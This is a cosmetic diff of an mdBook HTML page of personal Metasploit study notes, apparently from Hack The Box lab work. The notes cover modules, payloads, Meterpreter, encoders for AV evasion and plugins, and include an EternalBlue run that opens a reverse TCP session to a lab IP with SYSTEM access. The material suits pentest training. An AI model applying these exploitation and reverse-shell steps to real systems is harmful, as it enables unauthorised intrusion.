@@ -12,22 +12,22 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="shortcut icon" href="../../favicon.png">
-        <link rel="stylesheet" href="../../css/variables.css">
-        <link rel="stylesheet" href="../../css/general.css">
-        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="shortcut icon" href="../../favicon-7514936c.png">
+        <link rel="stylesheet" href="../../css/variables-8adf115d.css">
+        <link rel="stylesheet" href="../../css/general-2459343d.css">
+        <link rel="stylesheet" href="../../css/chrome-ae938929.css">
+        <link rel="stylesheet" href="../../css/print-9e4910d8.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="../../fonts/fonts.css">
+        <link rel="stylesheet" href="../../fonts/fonts-9644e21d.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">
+        <link rel="stylesheet" id="mdbook-highlight-css" href="../../highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../../ayu-highlight-3fdfc3ac.css">
 
         <!-- Custom theme stylesheets -->
-        <link rel="stylesheet" href="../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../theme/custom-81a920ab.css">
 
 
         <!-- Provide site root and default themes to javascript -->
@@ -35,10 +35,10 @@
             const path_to_root = "../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../searchindex.js";
+            window.path_to_searchindex_js = "../../searchindex-6205a3f5.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../../toc.js"></script>
+        <script src="../../toc-eceb7dc6.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -52,7 +52,7 @@
             </div>
         </div>
     </div>
-    <div id="body-container">
+    <div id="mdbook-body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
@@ -81,12 +81,12 @@
             html.classList.add("js");
         </script>
 
-        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
             let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
@@ -101,78 +101,81 @@
             }
         </script>
 
-        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
             <!-- populated by js -->
             <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
             <noscript>
                 <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
             </noscript>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
-        <div id="page-wrapper" class="page-wrapper">
+        <div id="mdbook-page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky">
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
-                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
-                            <i class="fa fa-bars"></i>
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                         </label>
-                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
-                            <i class="fa fa-paint-brush"></i>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                         </button>
-                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
-                            <i class="fa fa-search"></i>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                         </button>
                     </div>
 
                     <h1 class="menu-title">Cybersecurity Notes</h1>
 
                     <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
                         <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
-                            <i id="git-repository-button" class="fa fa-github"></i>
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span>
                         </a>
 
                     </div>
                 </div>
 
-                <div id="search-wrapper" class="hidden">
-                    <form id="searchbar-outer" class="searchbar-outer">
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                         <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                             <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                             </div>
                         </div>
                     </form>
-                    <div id="searchresults-outer" class="searchresults-outer hidden">
-                        <div id="searchresults-header" class="searchresults-header"></div>
-                        <ul id="searchresults">
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
                         </ul>
                     </div>
                 </div>
 
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                 <script>
-                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
-                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
-                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                         link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                     });
                 </script>
 
-                <div id="content" class="content">
+                <div id="mdbook-content" class="content">
                     <main>
                         <style>
 .mdbook-callouts {
@@ -412,19 +415,19 @@
 }
 </style>
 <h1 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h1>
-<p>... is Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and moularized exploits. The Metasploit Framework includes a suite of tools that you can use to test security vulns, enumerate networks, execute attacks, and evade detection. At its core, the Metasploit Project is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.</p>
+<p>… is Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and moularized exploits. The Metasploit Framework includes a suite of tools that you can use to test security vulns, enumerate networks, execute attacks, and evade detection. At its core, the Metasploit Project is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.</p>
 <p>The modules mentioned are actual exploit PoCs that have already been developed and tested in the wild and integrated within the framework to provide pentesters with ease of access to different attack vectors for different platforms and services. Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get you through the most common unpatched vulns.</p>
 <h2 id="architecture"><a class="header" href="#architecture">Architecture</a></h2>
 <h3 id="data-documentation-lib"><a class="header" href="#data-documentation-lib">Data, Documentation, Lib</a></h3>
 <p>These are the base files for the framework. The data and lib are the functioning parts of the msfconsole interface, while the documentation folder contains all the technical details about the project.</p>
 <h3 id="modules"><a class="header" href="#modules">Modules</a></h3>
-<p>... are split into separate categories and contained in the following folders:</p>
+<p>… are split into separate categories and contained in the following folders:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ ls /usr/share/metasploit-framework/modules
 
 auxiliary  encoders  evasion  exploits  nops  payloads  post
 </code></pre>
 <h3 id="plugins"><a class="header" href="#plugins">Plugins</a></h3>
-<p>... offer the pentester more flexibility when using msfconsole since they can easy be manually or automatically loaded as needed to provide extra functionality and automation during your assessment.</p>
+<p>… offer the pentester more flexibility when using msfconsole since they can easy be manually or automatically loaded as needed to provide extra functionality and automation during your assessment.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
 
 aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
@@ -498,7 +501,7 @@ Metasploit tip: Use sessions -1 to interact with the last opened session
 msf6 &gt; 
 </code></pre>
 <h3 id="engagement-structure"><a class="header" href="#engagement-structure">Engagement Structure</a></h3>
-<p><img src="../../images/metasploit1.png" alt="metasploit 1" /></p>
+<p><img src="../../images/metasploit1.png" alt="metasploit 1"></p>
 <h2 id="modules-1"><a class="header" href="#modules-1">Modules</a></h2>
 <p>Syntax:</p>
 <pre><code class="language-bash">&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
@@ -506,8 +509,13 @@ msf6 &gt;
 <h3 id="index-no"><a class="header" href="#index-no">Index No.</a></h3>
 <p>the no. tag will be displayed to select the exploit you want afterward during your searches.</p>
 <h3 id="type"><a class="header" href="#type">Type</a></h3>
-<p>... the type tag is the first level of segregation between Metasploit modules.</p>
-<div class="table-wrapper"><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody>
+<p>… the type tag is the first level of segregation between Metasploit modules.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
 <tr><td>Auxiliary</td><td>scanning, fuzzing, sniffing, and admin capabilties; offer extra assistance and functionality</td></tr>
 <tr><td>Encoders</td><td>ensure that payloads are intact to their destination</td></tr>
 <tr><td>Exploits</td><td>defined as modules that exploit a vuln that will allow for the payload delivery</td></tr>
@@ -515,7 +523,8 @@ msf6 &gt;
 <tr><td>Payloads</td><td>code runs remotely and calls back to the attacker machine to establish a connection</td></tr>
 <tr><td>Plugins</td><td>additional scripts can be integrated within an assessment with msfconsole and coexist</td></tr>
 <tr><td>Post</td><td>wide array of modules to gather information, pivot deeper, etc.</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <p>Note that when selecting a module to use for payload delivery, the <code>use &lt;no.&gt;</code> command can only be used with the following modules that can be used as initiators:</p>
 <ul>
@@ -828,7 +837,7 @@ meterpreter&gt; shell
 C:\Windows\system32&gt;
 </code></pre>
 <h2 id="targets"><a class="header" href="#targets">Targets</a></h2>
-<p>... are unique OS identifiers taken from the versions of those specific OS which adapt the selected exploit module to run on that particular version of the OS. The <code>show targets</code> command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let you know that you need to select an exploit module first.</p>
+<p>… are unique OS identifiers taken from the versions of those specific OS which adapt the selected exploit module to run on that particular version of the OS. The <code>show targets</code> command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let you know that you need to select an exploit module first.</p>
 <pre><code class="language-bash">msf6 &gt; show targets
 
 [-] No exploit module selected.
@@ -999,11 +1008,11 @@ target =&gt; 6
 <p>There are three different types of payloads in Metasploit: Singles, Stagers, and Stages.</p>
 <h3 id="payload-types"><a class="header" href="#payload-types">Payload Types</a></h3>
 <h4 id="singles"><a class="header" href="#singles">Singles</a></h4>
-<p>... contain the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. Singles are self-contained payloads. They are the sole object sent and executed on the target system, getting you a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.</p>
+<p>… contain the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. Singles are self-contained payloads. They are the sole object sent and executed on the target system, getting you a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.</p>
 <h4 id="stagers"><a class="header" href="#stagers">Stagers</a></h4>
-<p>... work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.</p>
+<p>… work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.</p>
 <h4 id="stages"><a class="header" href="#stages">Stages</a></h4>
-<p>... are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC injection, and others. Payload stages automatically use middle stagers.</p>
+<p>… are payload components that are downloaded by stager’s modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC injection, and others. Payload stages automatically use middle stagers.</p>
 <h3 id="staged-payloads"><a class="header" href="#staged-payloads">Staged Payloads</a></h3>
 <p>A staged payload is an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.</p>
 <pre><code class="language-bash">msf6 &gt; show payloads
@@ -1028,8 +1037,8 @@ target =&gt; 6
 &lt;SNIP&gt;
 </code></pre>
 <h4 id="meterpreter-payload"><a class="header" href="#meterpreter-payload">Meterpreter Payload</a></h4>
-<p>... is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be loaded and unloaded dynamically as required.</p>
-<p>Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has "infected". It offers you a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens.</p>
+<p>… is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be loaded and unloaded dynamically as required.</p>
+<p>Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has “infected”. It offers you a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens.</p>
 <p>Using Meterpreter, you can also load in different Plugins to assist you with your assessment.</p>
 <h3 id="searching-for-payloads"><a class="header" href="#searching-for-payloads">Searching for Payloads</a></h3>
 <pre><code class="language-bash">msf6 &gt; show payloads
@@ -1163,7 +1172,7 @@ Exploit target:
 <li>LHOST</li>
 <li>LPORT</li>
 </ul>
-<p>... leads to:</p>
+<p>… leads to:</p>
 <pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run
 
 [*] Started reverse TCP handler on 10.10.14.15:4444 
@@ -1206,7 +1215,7 @@ meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 </code></pre>
 <h2 id="encoders"><a class="header" href="#encoders">Encoders</a></h2>
-<p>... assist with making payloads compatible with different processor architectures while at the same time helping with av evasion.</p>
+<p>… assist with making payloads compatible with different processor architectures while at the same time helping with av evasion.</p>
 <p>These architectures include:</p>
 <ul>
 <li>x64</li>
@@ -1359,7 +1368,7 @@ Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
  tehtris               false     v0.1.2                                                                                                                     20220505
 </code></pre>
 <h2 id="databases"><a class="header" href="#databases">Databases</a></h2>
-<p>... are used to keep track of your results.</p>
+<p>… are used to keep track of your results.</p>
 <h3 id="setting-it-up"><a class="header" href="#setting-it-up">Setting it up</a></h3>
 <h4 id="postgresql-status"><a class="header" href="#postgresql-status">PostgreSQL Status</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ sudo service postgresql status
@@ -1505,12 +1514,12 @@ msf6 &gt; db_status
 <p>These databases can be exported and imported. This is especially useful when you have extensive lists of hosts, loot, notes, and stored vulns for these hosts. After confirming that the database is successfully connected, you can organize your workspace.</p>
 <h4 id="workspaces"><a class="header" href="#workspaces">Workspaces</a></h4>
 <p>Like a folder in a project. You can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.</p>
-<p>To view the current workspace list, use the <code>workspace</code> command. Adding a <code>-a</code> or <code>-d</code> switch after the command, followed by the workspace's name, will either add or delete that workspace to the database.</p>
+<p>To view the current workspace list, use the <code>workspace</code> command. Adding a <code>-a</code> or <code>-d</code> switch after the command, followed by the workspace’s name, will either add or delete that workspace to the database.</p>
 <pre><code class="language-bash">msf6 &gt; workspace
 
 * default
 </code></pre>
-<p>Notice that the default workspace is named "default" and is currently in use accoding to the <code>*</code>.</p>
+<p>Notice that the default workspace is named “default” and is currently in use accoding to the <code>*</code>.</p>
 <pre><code class="language-bash">msf6 &gt; workspace -a Target_1
 
 [*] Added workspace: Target_1
@@ -1819,7 +1828,7 @@ Usage: loot [options]
   -S,--search       Search string to filter by
 </code></pre>
 <h2 id="plugins-1"><a class="header" href="#plugins-1">Plugins</a></h2>
-<p>... are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework.</p>
+<p>… are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework.</p>
 <h3 id="using-plugins"><a class="header" href="#using-plugins">Using Plugins</a></h3>
 <p>To start using a plugin, you will need to ensure it is installed in the correct directory on your machine. Navigating to <code>/usr/share/metasploit-framework/plugins</code>, which is the default directory for every new installation of msfconsole, should show you which plugins you have to your availability.</p>
 <p>If the plugin is found there, you can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use.</p>
@@ -1852,7 +1861,7 @@ nessus_policy_list          List all polciies
 nessus_policy_del           Delete a policy
 </code></pre>
 <h3 id="installing-new-plugins"><a class="header" href="#installing-new-plugins">Installing new Plugins</a></h3>
-<p>To install new custom plugins not included in new updates of the distro, you can take the .rb file provided on the maker's page and replace it in the folder at <code>/usr/share/metasploit-framework/plugins</code> with the proper permissions.</p>
+<p>To install new custom plugins not included in new updates of the distro, you can take the .rb file provided on the maker’s page and replace it in the folder at <code>/usr/share/metasploit-framework/plugins</code> with the proper permissions.</p>
 <h4 id="downloading-msf-plugins"><a class="header" href="#downloading-msf-plugins">Downloading MSF Plugins</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
 d41y@htb[/htb]$ ls Metasploit-Plugins
@@ -1870,7 +1879,7 @@ growl.rb           openvas.rb     sounds.rb
 <h4 id="msf---copying-plugin-to-msf"><a class="header" href="#msf---copying-plugin-to-msf">MSF - Copying Plugin to MSF</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
 </code></pre>
-<p>Afterward, launch msfconsole and check the plugin's installation by running the <code>load</code> command. After the plugin has been loaded, the help menu at the msfconsole is automatically extended by additional functions.</p>
+<p>Afterward, launch msfconsole and check the plugin’s installation by running the <code>load</code> command. After the plugin has been loaded, the help menu at the msfconsole is automatically extended by additional functions.</p>
 <h4 id="msf---load-plugin"><a class="header" href="#msf---load-plugin">MSF - Load Plugin</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ msfconsole -q
 
@@ -1943,7 +1952,7 @@ Postauto Commands
 &lt;SNIP&gt;
 </code></pre>
 <h2 id="mixins"><a class="header" href="#mixins">Mixins</a></h2>
-<p>... are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when you:</p>
+<p>… are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when you:</p>
 <ol>
 <li>want to provide a lot of optional features for a class</li>
 <li>want to use one particular feature for a multitude of classes</li>
@@ -1971,7 +1980,7 @@ msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1
 meterpreter &gt; 
 </code></pre>
 <p>This is specifically useful when you want to run an additional module on an already exploited system with a formed, stable communication channel.</p>
-<p>This can be done by backgrounding your current session, which is formed due to the success of the first exploit, searching for the second module you wish to run, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module's <code>show option</code> menu.</p>
+<p>This can be done by backgrounding your current session, which is formed due to the success of the first exploit, searching for the second module you wish to run, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module’s <code>show option</code> menu.</p>
